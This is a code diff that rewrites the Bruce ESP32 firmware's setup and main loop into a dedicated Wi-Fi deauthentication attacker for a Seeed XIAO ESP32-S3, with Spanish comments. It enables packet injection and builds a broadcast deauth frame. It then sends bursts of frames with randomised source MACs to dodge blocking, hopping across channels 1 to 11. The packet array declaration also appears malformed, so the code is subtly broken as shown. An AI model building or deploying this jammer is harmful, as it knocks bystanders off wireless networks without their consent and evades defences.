@@ -471,91 +471,57 @@ void setup() {
     setBrightness(bruceConfig.bright, false);
     // end of post gpio begin
 
-    // #ifndef USE_TFT_eSPI_TOUCH
-    // This task keeps running all the time, will never stop
-    xTaskCreate(
-        taskInputHandler,              // Task function
-        "InputHandler",                // Task Name
-        INPUT_HANDLER_TASK_STACK_SIZE, // Stack size
-        NULL,                          // Task parameters
-        2,                             // Task priority (0 to 3), loopTask has priority 2.
-        &xHandle                       // Task handle (not used)
-    );
-    // #endif
-#if defined(HAS_SCREEN)
-    bruceConfig.openThemeFile(bruceConfig.themeFS(), bruceConfig.themePath, false);
-    if (!bruceConfig.instantBoot) {
-        boot_screen_anim();
-        startup_sound();
-    }
-    if (bruceConfig.wifiAtStartup) {
-        log_i("Loading Wifi at Startup");
-        xTaskCreate(
-            wifiConnectTask,   // Task function
-            "wifiConnectTask", // Task Name
-            4096,              // Stack size
-            NULL,              // Task parameters
-            2,                 // Task priority (0 to 3), loopTask has priority 2.
-            NULL               // Task handle (not used)
-        );
-    }
-#endif
-    //  start a task to handle serial commands while the webui is running
-    startSerialCommandsHandlerTask(true);
+    // 1. Configuramos el chip Wi-Fi del ESP32-S3 en modo inyección
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    esp_wifi_set_promiscuous(true);
 
-    wakeUpScreen();
-    if (bruceConfig.startupApp != "" && !startupApp.startApp(bruceConfig.startupApp)) {
-        bruceConfig.setStartupApp("");
-    }
+    // 2. Preparamos el pin del LED Naranja de tu placa Seeed XIAO
+    pinMode(21, OUTPUT);
+    digitalWrite(21, HIGH); // Lo dejamos apagado al inicio
 }
 
 /**********************************************************************
  **  Function: loop
- **  Main loop
+ **  Main loop - MODIFICADO PARA SEEED XIAO ESP32S3 DEDICADO
  **********************************************************************/
-#if defined(HAS_SCREEN)
 void loop() {
-#if !defined(LITE_VERSION) && !defined(DISABLE_INTERPRETER)
-    if (interpreter_state > 0) {
-        vTaskDelay(pdMS_TO_TICKS(10));
-        interpreter_state = 2;
-        Serial.println("Entering interpreter...");
-        while (interpreter_state > 0) { vTaskDelay(pdMS_TO_TICKS(500)); }
-        if (interpreter_state == 0) {
-            Serial.println("Interpreter put to background.");
-        } else {
-            Serial.println("Exiting interpreter...");
+    // Estructura de paquete Deauth Broadcast
+    static uint8_t deauthPacket = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino (Todos los clientes)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Origen aleatorio
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID aleatorio
+        0x00, 0x00, 0x07, 0x00
+    };
+
+    static int currentChannel = 1;
+
+    // Sintonizar la antena de la Seeed XIAO al canal correspondiente
+    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+    Serial.printf("[XIAO S3] Atacando Canal: %d\n", currentChannel);
+
+    // Encendemos el LED integrado naranja (LOW enciende en la XIAO)
+    digitalWrite(21, LOW);
+
+    // Emitir ráfaga rápida de 8 paquetes modificando la MAC origen para saltar bloqueos
+    for (int i = 0; i < 8; i++) {
+        for (int b = 10; b < 22; b++) {
+            deauthPacket[b] = random(0x00, 0xFF);
         }
-        if (interpreter_state == -1) { interpreterTaskHandler = NULL; }
-        previousMillis = millis(); // ensure that will not dim screen when get back to menu
+        // Inyectar el paquete directo al aire
+        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+        delay(2);
     }
-#endif
-    tft.fillScreen(bruceConfig.bgColor);
 
-    mainMenu.begin();
-    delay(1);
+    // Apagamos el LED naranja y esperamos un instante antes de saltar de frecuencia
+    digitalWrite(21, HIGH);
+    delay(150);
+
+    // Avanzar de canal en la banda de 2.4 GHz (Canales 1 al 11)
+    currentChannel++;
+    if (currentChannel > 11) {
+        currentChannel = 1;
+    }
 }
-#else
 
-void loop() {
-    tft.setLogging();
-    Serial.println(
-        "\n"
-        "██████  ██████  ██    ██  ██████ ███████ \n"
-        "██   ██ ██   ██ ██    ██ ██      ██      \n"
-        "██████  ██████  ██    ██ ██      █████   \n"
-        "██   ██ ██   ██ ██    ██ ██      ██      \n"
-        "██████  ██   ██  ██████   ██████ ███████ \n"
-        "                                         \n"
-        "         PREDATORY FIRMWARE\n\n"
-        "Tips: Connect to the WebUI for better experience\n"
-        "      Add your network by sending: wifi add ssid password\n\n"
-        "At your command:"
-    );
-
-    // Enable navigation through webUI
-    tft.fillScreen(bruceConfig.bgColor);
-    mainMenu.begin();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
-}
-#endif
